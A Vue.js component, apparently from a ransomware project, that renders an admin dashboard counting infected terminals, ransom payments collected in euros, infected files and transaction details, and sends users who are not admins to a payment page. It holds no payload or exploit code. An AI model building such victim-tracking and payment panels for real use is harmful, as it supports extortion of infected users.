<template>

    <div v-if="token" class="layout_horizontal">
        <Header/>

        <FlashMessage
            v-if="error"
            :type="'error'"
            :message="error"
        />

        <div v-else class="home">

            <FlashMessage
                v-if="email.error || email.message"
                :type="email.error ? 'error' : 'success'"
                :message="email.error ? email.error :  email.message"
            />

            <div>
                <div class="card paragraphe">
                    <div class="grid">
                        <div class="card-statistics">
                            <p class="text-center medium">
                                Terminaux&nbsp;infectés&nbsp;
                            </p>
                            <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                        </div>
                        <div class="card-statistics">
                            <p class="text-center medium">
                                Sous-sous dans les po-poches
                            </p>
                            <h2 class="text-danger text-center large">{{ totalAmount }} €</h2>
                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                        </div>
                    </div>
                </div>
                <div class="grid">
                    <InfectedFileStat :infectedFiles="infectedFiles" />
                    <PaymentStat :payments="payments" @clickHandler="getTransaction"/>
                </div>
            </div>
            <div v-if="transaction" class="card paragraphe card--payment-detail">
                <PaymentDetail
                    :token="token"
                    :transaction="transaction"
                    :user="transaction.user"
                    :error="error"
                />
            </div>

        </div>
    </div>

</template>

<script lang="ts">
import {defineComponent} from 'vue';
import Header from '../components/commons/Header.vue';
import HttpRequest from '../core/services/http/HttpRequest';
import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
import FlashMessage from "../components/FlashMessage.vue";
import PaymentStat from "../components/stats/PaymentStat.vue";
import InfectedFileStat from "../components/stats/InfectedFileStat.vue";
import { Transaction } from '../core/models/transaction';
import { Log } from '../core/models/log';
import PaymentDetail from "../components/dashboard/PaymentDetail.vue";

export default defineComponent({
    name: 'Home',
    data() {
        return {
            error: null as string | null,
            token: isLogged(),
            infectedFiles: {} as Log[],
            payments: {} as Transaction[],
            infectedTerminals: 0,
            totalAmount: 0,
            email: {
                message: null as string | null,
                error: null as string | null
            },
            transaction: null as Transaction | null
        }
    },
    components: {
        PaymentDetail,
        InfectedFileStat,
        PaymentStat,
        FlashMessage,
        Header
    },
    methods: {
        call(token: string | null): void {
            HttpRequest.fetchAllLogs('/api/logs', token).then((data) => {
                this.payments = data.transactions
                this.infectedFiles = data.logs
                this.infectedTerminals = data.infectedTerminals
                this.totalAmount = data.totalAmount
            }).catch((error: any) => {
                this.error = error;
            });

        },
        getTransaction(id: number) {
            HttpRequest.get('/api/transactions/'+id, this.token)
                .then((res) => {
                    if(res.error) {
                        this.error = res.message;
                    }
                    this.transaction = res.transaction
                }).catch((error) => {
                this.error = error;
            });
        }
    },
    created() {
        if (this.token) {
            isTokenExpired(this.token);
            if(!isAdmin(this.token)) {
                this.$router.push('/payment');
            } else {
                this.call(this.token);
            }
        } else {
            this.$router.push('/login')
        }
    }
});
</script>

<style lang="scss" scoped>
 .card-statistics:not(:first-child) {
     margin-left: 2rem;
 }
 .card-statistics:not(:last-child) {
      margin-right: 2rem;
  }
</style>
